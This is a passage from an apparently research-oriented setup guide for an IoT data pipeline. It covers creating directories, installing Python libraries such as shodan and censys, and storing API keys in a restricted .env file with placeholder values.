sudo chown pipeline:pipeline /opt/iot-pipeline /var/lib/iot-pipeline /var/log/iot-pipeline

# Install Python dependencies
sudo -u pipeline pip3 install --user \
    psycopg2-binary \
    shodan \
    censys \
    networkx \
    python-louvain \
    python-dotenv \
    requests
```

### Environment Variables

Store secrets in `/opt/iot-pipeline/.env` (owned by `pipeline`, mode `600`):
```bash
SHODAN_API_KEY=your_key_here
CENSYS_API_ID=your_id_here
CENSYS_API_SECRET=your_secret_here
DATABASE_URL=postgresql://pipeline:password@localhost/iot_research
```

```bash
sudo chown pipeline:pipeline /opt/iot-pipeline/.env
sudo chmod 600 /opt/iot-pipeline/.env
```

---

*Document version: Phase 1 — April 2026*
*Next review: after 2 weeks of data collection (Week 3–4)*
